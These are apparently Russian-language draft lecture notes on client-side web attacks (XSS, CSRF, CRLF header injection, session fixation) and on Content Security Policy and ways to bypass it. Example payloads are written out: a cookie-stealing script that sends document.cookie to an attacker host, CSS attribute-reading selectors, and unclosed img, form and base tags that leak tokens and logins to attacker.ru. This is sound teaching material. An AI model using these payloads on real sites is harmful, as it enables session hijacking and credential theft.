TODO
1. переименовать все в site.com и attakerhost.org
2. поправить ширину запроса в header injection

0. Введение

  	0.1 немного о безопасности  web.
		В отличии от атак на серверную часть, клиентские атаки часто ориентированы непосредственно на пользователя, то есть включают в себя социальную составляющую: нам, как атакующей стороне, нужно заставить другого человека произвести определенные действия (перейти по определенной ссылке, прочитать письмо) для реализации атаки

    0.2 статистика от Positive Technologies
    	( http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf )
    	В 2015 году получила распространение уязвимость среднего уровня риска «Межсайтовое выполнение сценариев» (Cross-Site Scripting, XSS), занимавшая вторую строчку рейтинга в 2014 году. Данная ошибка была обнаружена в программном коде 80% исследованных ресурсов. В результате ее эксплуатации злоумышленник может внедрить в браузер пользователя произвольные HTML-теги, включая сценарии на языке JavaScript и других языках, и таким образом получить значение идентификатора сессии атакуемого и совершитьиные неправомерные действия, например фишинговые атаки.

    	Второе место занимает недостаток безопасности «Утечка информации» (Information Leakage): данная проблема была обнаружена в 50% приложений. Зачастую на страницах приложений разглашается такая чувствительная информация, как фрагменты исходных кодов приложения, персональные и учетные данные пользователей, конфигурация сервера. Нарушитель может использовать полученные данные при планировании и проведении атак. Около половины веб-сайтов содержат также уязвимости, связанные с отсутствием защиты от подбора учетных данных (Brute Force).

	0.3 что такое Same-origin policy (SOP)? и зачем он нужен?
		Same-origin policy это основной механизм защиты данных и методов, пришедших из разных источников. Представьте себе, что было бы, если бы этот механизм не работал: мы создаем сайт на любом, выбранном нам домене, после чего заманиваем туда пользователей. Когда пользователь заходит к нам на сайт, мы подгружаем ему javascript, который читает все его письма с gmail, где пользователь залогинен параллельно, а вишенкой на торте - мы отправляем спам всем его друзьям в facebook. В реальной жизни подобное вот так вот напрямую провернуть нельзя и именно из-за SOP, обход которой и является целью большинства клиентских атак.

    0.4 рассмотрение CSRF, XSS, Information Leakage, header injection

	0.4.1 CSRF  ( https://habrahabr.ru/post/64922/ )
		CSRF расшифровывается как cross-site request forgery. Данная атака базируется на одной из основных идей www - идее о том, что страницы могут включать в себя содержимое из разных источников. Это достаточно простая атака, но может дать весьма интересные результаты при грамотном подходе.

	0.4.2 XSS

		XSS означает Cross Site Scripting (межсайтовый скриптинг). Так как аббревиатура CSS занята под Каскадные Таблицы Стилей, то исользуют аббревиатуру именно XSS, а не CSS. Эта уязвимость позволяет выполнять вредоносный JavaScript код «без спроса» пользователя путем вставки его в html код сайта.

		XSS-атаки - пожалуй, самый распространенный тип атак. Найти просто - всё, что нужно, это тщательно изучить код страницы и входные параметры. Защититься проблематично - вылезать может в совершенно неожиданных местах. Степень опасности - от незначительной до ... просто почитайте эту историю, почти технотриллер, о том, как поломали apache.org: https://blogs.apache.org/infra/entry/apache_org_04_09_2010﻿

		Межсайтовый скриптинг – еще одна ошибка валидации пользовательских данных, которая позволяет передать JavaScript код на исполнение в браузер пользователя. Атаки такого рода часто также называют HTML-инъекциями, ведь механизм их внедрения очень схож с SQL-инъекциями, но в отличие от последних, внедряемый код исполняется в браузере пользователя. Чем это чревато? 

		Во-первых, злоумышленник может украсть вашу сессионную cookie, последствия чего были описаны во втором пункте, буквально парой абзацев выше. Нужно отметить, что далеко не все серверы приложений уязвимы к данному типу атак, об этом мы отдельно поговорим в пункте под номером 5.

		Во-вторых, могут быть украдены данные, вводимые в формы на зараженной странице. А это могут быть конфиденциальные персональные данные, или, что еще хуже, данные кредитной карты вместе с CVC-кодом. 

		В третьих, через JavaScript можно изменять данные, расположенные на странице, например, там могут быть реквизиты для банковского перевода, которые злоумышленник с удовольствием подделает и заменит подставными.


		0.4.2.1
			## XSS:reflected (отраженные)
			http://www.site.com/page.php?var=<script>alert('xss');</script>

			Атака, основанная на отражённой уязвимости, на сегодняшний день является самой распространенной XSS-атакой.[13] Эти уязвимости появляются, когда данные, предоставленные веб-клиентом, чаще всего в параметрах HTTP-запроса или в форме HTML, исполняются непосредственно серверными скриптами для синтаксического анализа и отображения страницы результатов для этого клиента, без надлежащей обработки[14]. Отражённая XSS-атака срабатывает, когда пользователь переходит по специально подготовленной ссылке.

			Если сайт не экранирует угловые скобки, преобразуя их в «&lt;» и «&gt;», получим скрипт на странице результатов поиска.

			Отражённые атаки, как правило, рассылаются по электронной почте или размещаются на Web-странице. URL приманки не вызывает подозрения, указывая на надёжный сайт, но содержит вектор XSS. Если доверенный сайт уязвим к вектору XSS, то переход по ссылке может привести к тому, что браузер жертвы начнет выполнять встроенный скрипт.

		0.4.2.2
			## XSS:stored (хранимые)
			var іmg = new Image();
			іmg.srс = 'http://attackerhost/xss?' + document.cookie;

			Хранимый XSS является наиболее разрушительным типом атаки. Хранимый XSS возможен, когда злоумышленнику удается внедрить на сервер вредоносный код, выполняющийся в браузере каждый раз при обращении к оригинальной странице. Классическим примером этой уязвимости являются форумы, на которых разрешено оставлять комментарии в HTML формате без ограничений, а также другие сайты Веб 2.0 (блоги, вики, имиджборд), когда на сервере хранятся пользовательские тексты и рисунки. Скрипты вставляются в эти тексты и рисунки.

			Фрагмент кода похищения ключа с идентификатором сессии (session ID):

		0.4.2.3
			## XSS:dom-base
			http://site.com/index.html?<script>alert('xss')</script>
			<script>
				document.write(unescape(documant.location.href);
			</script>

			<form onsubmit="document.write(this.t.value)">
			<input type='text' id = 't'>
			</form>

			XSS в DOM-модели возникает на стороне клиента во время обработки данных внутри JavaScript сценария. Данный тип XSS получил такое название, поскольку реализуется через DOM (Document Object Model) — не зависящий от платформы и языка программный интерфейс, позволяющий программам и сценариям получать доступ к содержимому HTML и XML-документов, а также изменять содержимое, структуру и оформление таких документов. При некорректной фильтрации возможно модифицировать DOM атакуемого сайта и добиться выполнения JavaScript-кода в контексте атакуемого сайта.

			Пример DOM-модели XSS — баг, найденный в 2011 году в нескольких JQuery плагинах[15]. Методы предотвращения DOM-модели XSS включают меры, характерные для традиционных XSS, но с реализацией на javascript и отправкой в веб-страницы — проверка ввода и предотвращение атаки[16]. Некоторые фреймворки javascript имеют встроенные защитные механизмы от этих и других типов атак, например AngularJS[17].


		0.4.2.4 xss наиболее опастные участки кода:
			document.write()
			document.writeln()
			eval()
			.innerHTML

	0.4.3 Information Leakage  
		Закоментированные участки кода.
		Незакрытые устаревшие API
		Данные не спрятанные за аутентификацию

	0.4.4 Header Injection & Session Fixation
		инъекция заголовков ( CRLF injection ) и фиксацию сессий. На первый взгляд, ничего существенного с их помощью сделать нельзя: первая весьма косвенно влияет на входные параметры, вторая - довольно старая и хорошо известная. Но в совокупности с другими уязвимостями и с появлением новых технологий разработки, эти атаки время от времени всплывают на поверхность и становятся актуальными. Опять. 

		http://test.com?jump=<user input>
		...
		Location: <user input>
		...

		http://test.com?jump=hell%0d%0aSet-Cookie: gotohell	%3d1
		...
		Location: hell
		Set-Cookie = 1
		...


		Фиксация сессии (Session Fixation) является методом нападения, который принудительно устанавливает идентификатор сессии (session ID) в определенное значение. В зависимости от функциональности сайта-мишени, чтобы “зафиксировать” идентификатор сессии может быть применено множество методов. Разнообразие этих методов - от применения Межсайтового программирования до забрасывания веб-сайта предварительно сформированными HTTP-запросами. Затем идентификатор пользовательской сессии фиксируется и злоумышленник ожидает тех, кто будет входить в систему. Как только пользователь сделает это, злоумышленник использует предопределенное значение идентификатора сессии, чтобы получить его онлайн идентификацию со всеми вытекающими последствиями.
		В зависимости от того, как формируются значения идентификаторов, существует два типа систем управления сессиями. Первый тип систем является “свободным”, который позволяет веб-браузерам указывать любой идентификатор. Второй тип систем является “строгим”, который принимает только значения, сформированные на сервере. В свободных системах, произвольный идентификатор сессии обрабатывается вообще без обращения к веб-сайту. Строгие системы требуют от злоумышленника обслуживания “сессии-ловушки”, с периодическим обращением к веб-сайты для предотвращения таймаутов по неактивности.
		Без активной защиты от фиксации сессии, атака может быть предпринята против любого веб-сайта использующего сессии для идентификации подлинности пользователей. Веб-сайты использующие идентификаторы сессий обычно применяют ключики (Cookie), также применяются URL и скрытые поля форм. К сожалению, сессии основанные на ключиках проще для нападений. Большинство, на настоящий момент выявленных методов атак, направлены на фиксацию именно ключиков.
		В отличие от похищения идентификаторов сессий пользователей, выполняемых после их входа на веб-сайт, фиксация сессии предоставляет значительно более широкие возможности для нападения. Активная часть нападения делается до входа пользователей в систему.

1. Как с этим всем можно справиться

	1.1 Content Security Policy:
		https://content-security-policy.com/
		CSP vs SOP:
			Одним из главных принципов безопасности браузеров и веба в целом является Same Origin Policy — дословно «политика единого источника» (устоявшегося термина до сих пор не существует). Ее суть заключается в проверке трех компонентов, из которых состоит origin: протокол, хост и порт. Если страница http://test1.ru/a.html пытается получить доступ к DOM страницы http://test2.ru/b.html, то у нее ничего не выйдет, так как хосты отличаются. Если бы SOP не существовал, любой сайт мог бы делать запросы на произвольные адреса и получать оттуда данные, что, как подсказывает логика, не есть хорошо. Причем страдали бы все: как пользователи, чьи персональные данные летали бы без принуждения, так и владельцы ресурсов, — в общем, в вебах творился бы полный хаос. Поэтому Same Origin Policy всех спасает и все счастливы. Однако есть одно но: что, если на страницу http://test1.ru/a.html внедрен злой скрипт с сайта http://test2.ru/, который делает плохие штуки в контексте браузера жертвы? В данном случае SOP бесполезен, ибо на <script src=”...”> политика не распространяется. Что же делать?	

		1.1.1 Поддерживаемые директивы:
			default-src
			script-src
			object-src
			style-src
			img-src
			media-src
			frame-src
			font-src
			connect-src
			report-uri

		1.1.2 Поддерживаемые значения:

		1.1.3 report-only
			Как было сказано, самая большая проблема в том, что между включением и отключением CSP нет никаких промежуточных значений. Однако с помощью report-only вы можете отправлять немного отличающийся заголовок:

			PHP
			<?php
			    header("Content-Security-Policy-Report-Only: <your directives>");
			?>
			В принципе, она говорит браузеру: “Действуй так, как будто все эти директивы применены, но ничего не блокируй, просто отправляй мне уведомления”. Это отличный способ тестировать директивы без риска блокировать нужные ресурсы.

			С report-only и report-uri, вы можете тестировать директивы CSP без риска и мониторить все, что связано с активностью CSP на сайте. Эта и предыдущая возможности прекрасно справляются с развертыванием и поддержкой CSP.

		1.1.4 Ограничения:
			С позиции веб-разработчика правильно и грамотно развернуть CSP на своем ресурсе довольно проблематично, так как для каждой страницы необходимо устанавливать отдельную политику. В настройке CSP ему может помочь такая директива, как report-uri, с помощью которой он может получать от браузера информацию о всех нарушениях политики. Отчет о нарушении CSP может выглядеть следующим образом:

			{  "csp-report": {  "document-uri": "http://test.ru/a.html",  "referrer": "http://test.ru/",  "blocked-uri": "http://attacker.ru/xss.js",  "violated-directive": "script-src http://cdn.test.ru http://ajax.googleapis.com",  "original-policy": "script-src http://cdn.test.ru http://ajax.googleapis.com; report-uri /csp_report_parser"  } }
			Получая отчеты, разработчик решает, какие источники нужно разрешить, и соответствующим образом обновляет политику — вручную либо с помощью специальных средств. Например, для Ruby есть gem от компании Twitter — secureheaders, позволяющий настроить не только CSP, но и установить другие модные заголовки, вроде X-XSS-Protection, X-Content-Type-Options и другие.

			Мобильный Twitter одним из первых стал использовать CSP
			Мобильный Twitter одним из первых стал использовать CSP
			Все бы хорошо, но почти в 100% случаев разработчик столкнется с проблемой инлайн-скриптов. Дело в том, что CSP 1.0 может либо полностью разрешить их, либо запретить, третьего не дано. Стандарт рассматривает инлайн-скрипты как большое зло, однако полностью отказаться от них в угоду CSP на обычном сайте, на котором заранее не планировалось разворачивать CSP, едва ли удастся. Поэтому, указав в script-src ‘unsafe-inline’, разработчик автоматически открывает все двери для атакующего.

			В разрабатываемой на данный момент спецификации CSP 1.1 есть частичное решение для этой проблемы — директива script-nonce, которая позволяет задать некое уникальное значение-токен для всех разрешенных скриптов. Таким образом, блокируются не все инлайн-скрипты, а только неизвестные:

			<script nonce=”9cdfb439c7876e703e307864c9167a15”> alert(“allowed”); </script> <script> alert(“not allowed”); </script>
			Очевидно, что такой подход не поможет защититься от случаев, когда у атакующего есть возможность внедрить код в скрипт с валидным токеном. Кроме того, есть масса вариантов обхода, о чем пойдет речь ниже.

		1.2 обход CSP

		1.2.1 ( Header Injection ) CRLF Injection
			При наличии CRLF-инъекции в заголовках ответа, то есть отсутствии фильтрации символа переноса строки, у атакующего есть возможность банального обхода CSP с помощью внедрения собственных директив. Здесь большую роль играет то, какой заголовок браузер будет использовать при наличии нескольких с одинаковым именем. Как в случае с HTTP Parameter Pollution, где одинаковые имена параметров обрабатываются по-разному на разных платформах, при внедрении еще одного заголовка Content-Security-Policy важно, где он окажется — перед первоначальным или после него, так как один браузер может взять последний заголовок, а другой — первый. Так, если браузер отдает приоритет первому и мы внедряем наш CSP перед настоящим, то обход тривиален:


			HTTP/1.1 200 OK Set-Cookie: language=ru; Content-Security-Policy: script-src 'unsafe-inline' * Content-Security-Policy: default-src 'self'
			Если же используется последний встреченный заголовок, то мы можем отправить его в тело страницы, отправив rnrn:

			ru;rnContent-Security-Policy: script-src 'unsafe-inline' *rnrn
			На выходе получим:

			HTTP/1.1 200 OK Set-Cookie: language=ru; Content-Security-Policy: script-src 'unsafe-inline' *  Content-Security-Policy: default-src 'self' …
			Таким образом, первоначальный заголовок попадет в содержание HTTP-ответа и не будет иметь силы.

		1.2.2 Scriptless Attacks

			Перейдем к более интересным вариантам обхода — на стороне клиента. Основная цель межсайтового скриптинга — получить некую приватную информацию пользователя, которая обычно хранится в cookie. Однако с введением таких мер защиты, как флаг httpOnly, запрещающий JS-скриптам доступ к защищаемым cookie, внедрением в браузеры XSS-фильтров (XSS Auditor в Chrome, XSSFilter в IE), собственно и самого CSP, исследователи безопасности все чаще обращают внимание на другие цели, например личные данные, различного рода токены (CSRF, oAuth, в скором будущем и script-nonce). При этом используются новые способы отправки данных на сторонние сайты, без JavaScript!

			CSSAR
			Еще в 2008 году Эдуардо Вела (Eduardo Vela), Дэвид Линдсей (David Lindsay) и Гарет Хейс (Gareth Heyes) представили технику чтения атрибутов тегов с помощью CSS-селекторов. На данный момент техника все так же актуальна. Если раньше она позиционировалась как обход NoScript, то сейчас ее можно использовать и для CSP. Суть CSSAR (CSS Attribute Reading) в брутфорсе значений с помощью селекторов атрибутов. Для этого на уязвимую страницу подключается CSS-файл с комбинациями выражений:

			input[value^=a] {background:url(http://attacker.ru/?a)}
			Если значение целевого инпута начинается с «a», то будет отправлен запрос на сайт атакующего через подгрузку фонового изображения, относящегося к соответствующей комбинации символов. CSS не имеет возможности указать позицию символа, поэтому для получения следующего знака необходимо сгенерировать массу вариантов вида

			input[value^=aa] {background:url(http://attacker.ru/?aa)}
			Поэтому конечный PoC может иметь объем в несколько сотен килобайтов.

			CSSAR в действии
			CSSAR в действии
			Вариант обхода № 4. Postcards from post-XSS world
			Интересные идеи предложил Михал Залевски (Michal Zalewski). Например, имея внедрение кода перед формой, защищенной CSRF-токеном, можно вставить незакрытый тег img:

			<img src=”http://attacker.ru?c=
			Все содержание страницы до следующей закрывающей кавычки, включая и целевой токен, после незакрытого атрибута src будет отправлено на сайт атакующего.

			Другой вектор — использование тега <textarea>, который работает как CDATA в XML. Внутри textarea допускаются любые символы, однако в отличие от предыдущего способа отправить полное содержание страницы можно только при участии пользователя, который должен самостоятельно отправить форму.

			Еще один способ использует тот факт, что формы не могут быть вложенными, поэтому внедрение незакрытого тега <form> перед целевой формой позволяет перенаправить ее данные на хост атакующего:

			<form action='http://attacker.ru/log.php'> ... <form action='login.php'> <input type="text" name="login"> <input type="password" name="password"> </form>
			Аналогичного результата можно достичь при помощи вектора с использованием тега <base>, который определяет URL для всех относительных путей на странице. Согласно стандарту, тег должен быть включен внутри <head>, однако большинство браузеров допускают использование тега в любом месте:

			<base href='http://attacker.ru/'> ... <form action='login.php'> <input type="text" name="login"> <input type="password" name="password"> </form>


//  1.1 ограничение доступа:
//      1.1.1 По методу запроса, по URI, по IP/подсети, user-agentу (http://www.cyberciti.biz/tips/linux-unix-bsd-nginx-webserver-security.html c 8-го пункта )
//      1.1.2 список с чем может играть nginx  ( http://nginx.org/en/docs/http/ngx_http_core_module.html#variables )

//  1.3  Мониторинг через логирование
//    1.3.1 интересно рассказано здесь о том как разделять логи по location и пр: https://www.youtube.com/watch?v=d8W4qJtRjDU
//    1.3.2 (???) еще про уведомления "с "обычного" ли места для этого пользователя запрос?".

//  1.4 nginxScript (https://www.nginx.com/resources/wiki/nginScript/)

//2. интересные инструменты для мониторинга/аудита nginx и другого.
//	2.1 nginx-amplify ( https://www.nginx.com/blog/setting-up-nginx-amplify-in-10-minutes/ https://habrahabr.ru/post/305384/ )
//  	2.2 еще https://habrahabr.ru/post/125206/
//  	где поиграть:
//  	https://sourceforge.net/projects/metasploitable/


  links:
  1. http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf
  2. https://stepik.org/course/Анализ-безопасности-веб-проектов-127

  links hidden:  
  1. https://ru.wikipedia.org/wiki/Межсайтовый_скриптинг
  2. https://forum.antichat.ru/threads/37838/
  csp:
  1. https://habrahabr.ru/company/nixsolutions/blog/271575/
  2. https://xakep.ru/2013/12/23/61798/
  3. http://prgssr.ru/development/politika-bezopasnosti-kontenta-vash-budushij-luchshij-drug.html